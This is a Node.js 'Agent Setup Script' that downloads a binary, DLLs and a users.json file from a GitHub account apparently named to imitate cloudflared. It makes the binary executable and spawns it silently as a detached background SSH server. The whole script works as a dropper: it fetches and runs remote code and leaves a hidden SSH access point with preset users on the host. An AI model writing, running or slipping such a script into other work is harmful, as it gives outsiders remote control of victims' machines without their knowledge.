/**
 * Agent Setup Script - Pure Node.js
 * Downloads Agent binaries, runtime files, methods.json, users.json from GitHub repository
 * Sets executable permissions and spawns ./agent
 */

const https = require('https');
const http = require('http');
const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');

const REPO_BASE = 'https://raw.githubusercontent.com/cloudflared9-hub/agent/main';

const FILES_TO_DOWNLOAD = [
    { url: `${REPO_BASE}/agent`, filename: 'agent', executable: true },
    { url: `${REPO_BASE}/agent.dll`, filename: 'agent.dll', executable: false },
    { url: `${REPO_BASE}/agent.runtimeconfig.json`, filename: 'agent.runtimeconfig.json', executable: false },
    { url: `${REPO_BASE}/agent.deps.json`, filename: 'agent.deps.json', executable: false },
    { url: `${REPO_BASE}/FxSsh.dll`, filename: 'FxSsh.dll', executable: false },
    { url: `${REPO_BASE}/methods.json`, filename: 'methods.json', executable: false },
    { url: `${REPO_BASE}/users.json`, filename: 'users.json', executable: false }
];

function download(url, destPath) {
    return new Promise((resolve, reject) => {
        const client = url.startsWith('https') ? https : http;

        client.get(url, (res) => {
            // Handle HTTP redirects (301, 302, 307, 308)
            if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
                return download(res.headers.location, destPath).then(resolve).catch(reject);
            }

            if (res.statusCode !== 200) {
                return reject(new Error(`Failed to download ${url}: HTTP status ${res.statusCode}`));
            }

            const fileStream = fs.createWriteStream(destPath);
            res.pipe(fileStream);

            fileStream.on('finish', () => {
                fileStream.close(resolve);
            });

            fileStream.on('error', (err) => {
                fs.unlink(destPath, () => {});
                reject(err);
            });
        }).on('error', (err) => {
            fs.unlink(destPath, () => {});
            reject(err);
        });
    });
}

async function setup() {
    const targetDir = process.cwd();
    console.log(`[+] Setting up Agent Server in: ${targetDir}`);

    for (const item of FILES_TO_DOWNLOAD) {
        const dest = path.join(targetDir, item.filename);
        try {
            process.stdout.write(`[*] Downloading ${item.filename}... `);
            await download(item.url, dest);
            console.log('OK');

            if (item.executable) {
                fs.chmodSync(dest, 0o755);
                console.log(`[+] Set chmod +x for ${item.filename}`);
            }
        } catch (err) {
            console.log('FAILED');
            console.error(`[!] Error with ${item.filename}: ${err.message}`);
        }
    }

    const agentBinPath = path.join(targetDir, 'agent');
    if (fs.existsSync(agentBinPath)) {
        console.log('[+] Launching Agent SSH server in background...');
        const child = spawn(agentBinPath, [], {
            cwd: targetDir,
            detached: true,
            stdio: 'ignore'
        });
        child.unref();
        console.log(`[+] Agent SSH server successfully spawned (PID: ${child.pid})`);
    } else {
        console.error('[-] Agent binary not found, execution skipped.');
    }
}

setup().catch((err) => {
    console.error(`[!] Setup failed: ${err.message}`);
});
